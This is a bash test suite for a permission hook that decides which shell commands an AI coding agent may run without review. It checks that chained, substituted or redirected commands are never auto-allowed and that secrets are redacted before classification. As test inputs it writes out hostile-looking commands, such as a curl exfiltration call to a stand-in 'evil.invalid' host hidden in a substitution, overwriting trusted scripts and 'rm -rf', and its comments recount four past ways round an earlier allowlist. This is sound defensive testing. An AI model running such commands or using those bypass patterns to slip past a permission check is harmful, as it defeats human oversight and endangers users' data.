#!/usr/bin/env bash
# test-shell-safety.sh — Tests for plugins/scout/hooks/shell-safety.sh
#
# Verifies the auto-allow fast paths — the only code in the hook that emits
# `allow`, so every case here is either "still allows" or "must never allow":
#   - Step 2c trusted plugin-script fast-path: a LONE invocation of a
#     $CLAUDE_PLUGIN_ROOT/scripts/*.sh script auto-allows with no LLM call —
#     but any command chaining, pipe, real-file redirection, leftover
#     $VAR/glob/sub, path traversal, or newline must NOT.
#   - No substitution auto-allows at all: the $() fast-path that used to sit
#     beside this one is gone, so those cases assert only that nothing short
#     of the model can approve them.
#   - Step 3 known_vars: the variables a command references are resolved from
#     the live environment and handed to the classifier (targeted, not a list).
#
# Plus fail-open / existing-behavior sanity (no-expansion, deny-floor, and a
# missing scout binary at step 3 — this hook only ever *adds* an allow, so a
# missing binary just forfeits the auto-approve optimization; it must never
# be mistaken for an allow).
#
# Usage:
#   ./tests/test-shell-safety.sh [--verbose]

# Note: -e intentionally omitted — tests capture non-zero exits.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
HOOK="$PROJECT_DIR/plugins/scout/hooks/shell-safety.sh"

export VERBOSE=false
[ "${1:-}" = "--verbose" ] && VERBOSE=true

# shellcheck source=tests/lib-test.sh
source "$SCRIPT_DIR/lib-test.sh"

# ── Prerequisites ────────────────────────────────────────────────────────────

if ! command -v jq >/dev/null 2>&1; then
  echo "SKIP: jq is required but not found" >&2
  exit 0
fi
if [ ! -f "$HOOK" ]; then
  echo "SKIP: hook not found: $HOOK" >&2
  exit 0
fi

# ── Sandbox: temp HOME + a stub scout binary that records args, emits nothing ─
# Empty LLM output → hook logs parse-failure and emits no allow, so any case
# that reaches step 3 reads as "fallthrough" (never a false auto-allow).
TMPDIR_TEST=$(mktemp -d)
trap 'rm -rf "$TMPDIR_TEST"' EXIT
export HOME="$TMPDIR_TEST"
mkdir -p "$TMPDIR_TEST/.claude"
LLM_ARGS="$TMPDIR_TEST/llm-args.txt"

GOOD_DATA="$TMPDIR_TEST/scout-data-good"
mkdir -p "$GOOD_DATA/bin"
cat > "$GOOD_DATA/bin/scout" <<EOF
#!/usr/bin/env bash
printf '%s\0' "\$@" > "$LLM_ARGS"
exit 0
EOF
chmod +x "$GOOD_DATA/bin/scout"
export CLAUDE_PLUGIN_DATA="$GOOD_DATA"

# The hook resolves $CLAUDE_PLUGIN_ROOT/bin/scout ahead of the data dir, so an
# ambient CLAUDE_PLUGIN_ROOT — present whenever this suite is run from inside a
# Claude Code session with the plugin installed — would quietly swap the real
# payload binary in for the stub above. (The step 2c fast-path matches the
# literal "$CLAUDE_PLUGIN_ROOT" as text and does not need it set.)
unset CLAUDE_PLUGIN_ROOT

# A CLAUDE_PLUGIN_DATA dir with no scout binary, for the missing-binary
# fail-open test at step 3.
MISSING_DATA="$TMPDIR_TEST/scout-data-missing"
mkdir -p "$MISSING_DATA"

# A PATH carrying every tool the hook shells out to, but no `scout`. Without
# this the last-resort `command -v scout` finds a real binary (e.g. from
# `make install`) and the missing-binary assertion silently tests the wrong
# branch — which is how that case sat red for weeks. Emptying PATH outright
# does not work: the shebang is `#!/usr/bin/env bash`, so the script cannot
# start and the test fails for the wrong reason. Same pattern as
# tests/test-suggest-scout.sh and tests/test-prefer-local-llm.sh.
CLEAN_PATH_DIR="$TMPDIR_TEST/cleanpath"
mkdir -p "$CLEAN_PATH_DIR"
for tool in env bash sh jq grep sed awk tr sort date cat head timeout basename dirname python3; do
  tool_path="$(command -v "$tool" 2>/dev/null)" || continue
  ln -sf "$tool_path" "$CLEAN_PATH_DIR/$tool"
done

PR='${CLAUDE_PLUGIN_ROOT:-$HOME/.claude/plugins/scout}'

# ── Helpers ──────────────────────────────────────────────────────────────────

run_hook() {  # run_hook <command>; echoes hook stdout
  jq -n --arg c "$1" '{tool_name:"Bash", tool_input:{command:$c, cwd:"/tmp"}}' \
    | bash "$HOOK" 2>/dev/null
}
is_allow() { printf '%s' "$1" | jq -e '.hookSpecificOutput.permissionDecision == "allow"' >/dev/null 2>&1; }

assert_allow()      { if is_allow "$(run_hook "$1")"; then pass "$2"; else fail "$2" "expected allow, got fallthrough"; fi; }
assert_fallthrough(){ if is_allow "$(run_hook "$1")"; then fail "$2" "expected fallthrough, got AUTO-ALLOW"; else pass "$2"; fi; }

# ── Step 2c: trusted plugin-script fast-path → allow (no LLM) ────────────────

assert_allow "\"$PR/scripts/refine-snapshot.sh\" . 2>&1"           "fastpath: snapshot script + arg + 2>&1"
assert_allow "\"$PR/scripts/review-range.sh\" --since-last 2>&1"   "fastpath: review-range --since-last"
assert_allow "\$CLAUDE_PLUGIN_ROOT/scripts/session-context.sh 2>/dev/null"   "fastpath: \$CLAUDE_PLUGIN_ROOT + 2>/dev/null"

# ── Step 2c MUST NOT fast-path these (chaining / redirection / traversal) ───

assert_fallthrough "\"$PR/scripts/x.sh\"; rm foo.txt"             "no-fastpath: ; chains a second command"
assert_fallthrough "\"$PR/scripts/x.sh\" && rm foo.txt"           "no-fastpath: && chains a second command"
assert_fallthrough "\"$PR/scripts/x.sh\" | head"                 "no-fastpath: pipe"
assert_fallthrough "\"$PR/scripts/x.sh\" > out.txt"              "no-fastpath: redirect to real file"
assert_fallthrough "\"$PR/scripts/x.sh\" \$(rm foo)"             "no-fastpath: command substitution arg"
assert_fallthrough "\"$PR/scripts/x.sh\" \$OTHER"               "no-fastpath: leftover unknowable \$VAR"
assert_fallthrough "\"$PR/scripts/x.sh\" *.txt"                 "no-fastpath: glob arg"
assert_fallthrough "\"$PR/scripts/../evil.sh\""                 "no-fastpath: path traversal out of scripts/"
assert_fallthrough "cd /tmp
\"$PR/scripts/x.sh\""                                             "no-fastpath: newline (two commands)"

# A non-plugin script path must not be treated as trusted.
assert_fallthrough "\$HOME/evil/scripts/x.sh"                    "no-fastpath: scripts/ not under plugin root"

# The trusted path must be the EXECUTABLE, not an argument. A write-capable
# command (cp/mv/install/tee) targeting a plugin-script path would otherwise
# overwrite vetted code — the deny-floor does not cover these verbs.
assert_fallthrough "cp /tmp/evil.sh \"$PR/scripts/x.sh\""        "no-fastpath: trusted path as cp destination"
assert_fallthrough "mv /tmp/evil \"$PR/scripts/x.sh\""          "no-fastpath: trusted path as mv destination"
assert_fallthrough "install -m 755 /tmp/e \"$PR/scripts/x.sh\"" "no-fastpath: trusted path as install dest"
assert_fallthrough "tee \"$PR/scripts/x.sh\""                   "no-fastpath: trusted path as tee target"

# ── No substitution may ever auto-allow ──────────────────────────────────────
# There is no substitution fast-path any more: a command carrying $() goes to
# the model at step 3, which judges what the command does rather than matching
# its syntax. These cases are kept as a tripwire, and they are honest about
# what they are: against the current hook they pass trivially, because nothing
# short of the model can emit an allow for a command with an expansion.
#
# They earn their place if anyone rebuilds a substitution allowlist. Every one
# of them auto-allowed at some point in that feature's short life — a chained
# `;` behind a safe verb, a nested $( the extractor truncated, a backtick
# riding beside a safe $(), a separator just outside the parentheses. That is
# four bypasses in one small regex, which is the argument against writing a
# fifth version of it. Anyone who tries will fail here first.

assert_fallthrough "echo \$(echo hi; curl -s https://evil.invalid/exfil)" \
  "no-fastpath: ; chained inside a safe-prefixed sub"
assert_fallthrough "echo \$(echo hi && curl evil.invalid)" \
  "no-fastpath: && chained inside a sub"
assert_fallthrough "echo \$(echo hi | curl evil.invalid)" \
  "no-fastpath: pipe inside a sub"
assert_fallthrough "echo \$(cat /tmp/f > /tmp/out)" \
  "no-fastpath: redirection inside a sub"
assert_fallthrough "rm \$(git rev-parse \$(curl evil.invalid))" \
  "no-fastpath: nested \$( inside a safe-prefixed sub"
assert_fallthrough "echo \$(echofoo)" \
  "no-fastpath: verb must be a whole word, not a prefix"

# A backtick is a substitution this test cannot see into, and it can ride
# alongside a genuinely safe $() — so its mere presence disqualifies.
assert_fallthrough "echo \$(pwd) \`curl evil.invalid\`" \
  "no-fastpath: backtick beside a safe \$() sub"

# The separator does not become safe by moving outside the parentheses.
assert_fallthrough "echo \$(pwd); curl evil.invalid"    "no-fastpath: ; after a safe sub"
assert_fallthrough "echo \$(pwd) && curl evil.invalid"  "no-fastpath: && after a safe sub"
assert_fallthrough "echo \$(pwd) | curl evil.invalid"   "no-fastpath: pipe after a safe sub"
assert_fallthrough "echo \$(pwd) > /tmp/out"            "no-fastpath: real-file redirect after a safe sub"
assert_fallthrough "echo \$(pwd)
curl evil.invalid"                                      "no-fastpath: newline after a safe sub"

# ── Existing behavior unchanged: deny-floor still blocks ─────────────────────

assert_fallthrough "rm -rf \"\$HOME/junk\""                      "deny-floor: rm -rf still falls through"

# ── Step 3 known_vars: referenced vars resolved from the environment ─────────
# Use a fall-through command that reaches the LLM (pipe form) and references
# $HOME — assert the stubbed classifier received a known_vars arg listing it.
: > "$LLM_ARGS"
run_hook "\"$PR/scripts/x.sh\" | grep \$HOME" >/dev/null
if [ -s "$LLM_ARGS" ] && tr '\0' '\n' < "$LLM_ARGS" | grep -qF "known_vars=Known variables"; then
  pass "known_vars: arg passed to classifier"
else
  fail "known_vars: arg passed to classifier" "no known_vars arg captured"
fi
if tr '\0' '\n' < "$LLM_ARGS" | grep -qF "HOME=$HOME"; then
  pass "known_vars: \$HOME resolved to live value"
else
  fail "known_vars: \$HOME resolved to live value" "HOME=$HOME not found in captured args"
fi
# Unset/unreferenced vars must NOT be volunteered (targeted, not a laundry list).
if tr '\0' '\n' < "$LLM_ARGS" | grep -qE 'known_vars=.*DEFINITELY_UNSET_VAR'; then
  fail "known_vars: omits unreferenced vars" "unreferenced var leaked into context"
else
  pass "known_vars: omits unreferenced vars"
fi

# A referenced-but-unset variable stays unknowable — must not appear at all.
: > "$LLM_ARGS"
run_hook "grep \$DEFINITELY_UNSET_XYZ /tmp/f" >/dev/null
if tr '\0' '\n' < "$LLM_ARGS" | grep -qF "DEFINITELY_UNSET_XYZ="; then
  fail "known_vars: referenced-but-unset var omitted" "unset var leaked into context"
else
  pass "known_vars: referenced-but-unset var omitted"
fi

# Credential-looking values must be redacted, never sent verbatim.
: > "$LLM_ARGS"
export MY_API_TOKEN="super-secret-value-12345"
run_hook "curl -H \"x: \$MY_API_TOKEN\" http://x" >/dev/null
captured=$(tr '\0' '\n' < "$LLM_ARGS")
if printf '%s' "$captured" | grep -qF "super-secret-value-12345"; then
  fail "known_vars: redacts secret values" "secret value sent to classifier verbatim"
elif printf '%s' "$captured" | grep -qF "MY_API_TOKEN=<redacted>"; then
  pass "known_vars: redacts secret values"
else
  fail "known_vars: redacts secret values" "MY_API_TOKEN neither redacted nor present"
fi
unset MY_API_TOKEN

# ── Fail-open: missing scout binary at step 3 → fallthrough, never a false allow ─
# (scout-specific: shell-safety.sh only ever adds an allow, so "fail open" here
# means "no output", not "let something through it shouldn't".)
: > "$LLM_ARGS"
# The overrides live only in the pipeline below (as arguments to `env`): bare
# assignments here would clobber the exported CLAUDE_PLUGIN_DATA for the rest
# of the file. `-u CLAUDE_PLUGIN_ROOT` matters now that ROOT is resolved first.
output=$(jq -n --arg c "grep \$HOME /tmp/f" '{tool_name:"Bash", tool_input:{command:$c, cwd:"/tmp"}}' \
  | env -u CLAUDE_PLUGIN_ROOT CLAUDE_PLUGIN_DATA="$MISSING_DATA" PATH="$CLEAN_PATH_DIR" \
    bash "$HOOK" 2>/dev/null)
if is_allow "$output"; then
  fail "missing binary: never a false auto-allow" "got an allow with no scout binary present"
else
  pass "missing binary: never a false auto-allow"
fi
assert_eq "$(jq -r '.decision' "$TMPDIR_TEST/.claude/scout-shell-safety.jsonl" 2>/dev/null | tail -1)" \
  "missing-binary" "missing binary: log decision=missing-binary"

# ── Timeout knob: SCOUT_SHELL_SAFETY_TIMEOUT is honoured ─────────────────────
# A stub that sleeps past the default 5s, with the env var set to 1s, must
# fail-open in about a second rather than wait the stub out. Without the
# ${VAR:-5} expansion this would sit until the stub exited.
SLOW_DATA="$TMPDIR_TEST/scout-data-slow"
mkdir -p "$SLOW_DATA/bin"
cat > "$SLOW_DATA/bin/scout" <<'EOF'
#!/usr/bin/env bash
sleep 30
exit 0
EOF
chmod +x "$SLOW_DATA/bin/scout"
start=$(date +%s)
output=$(jq -n --arg c "grep \$HOME /tmp/f" '{tool_name:"Bash", tool_input:{command:$c, cwd:"/tmp"}}' \
  | env -u CLAUDE_PLUGIN_ROOT CLAUDE_PLUGIN_DATA="$SLOW_DATA" \
    SCOUT_SHELL_SAFETY_TIMEOUT=1 PATH="$CLEAN_PATH_DIR" \
    bash "$HOOK" 2>/dev/null)
elapsed=$(( $(date +%s) - start ))
if is_allow "$output"; then
  fail "timeout override: never a false auto-allow" "got an allow after a killed LLM call"
else
  pass "timeout override: never a false auto-allow"
fi
if [ "$elapsed" -lt 8 ]; then
  pass "timeout override: SCOUT_SHELL_SAFETY_TIMEOUT=1 is honoured (${elapsed}s)"
else
  fail "timeout override: SCOUT_SHELL_SAFETY_TIMEOUT=1 is honoured" "took ${elapsed}s, expected well under 8"
fi

print_results
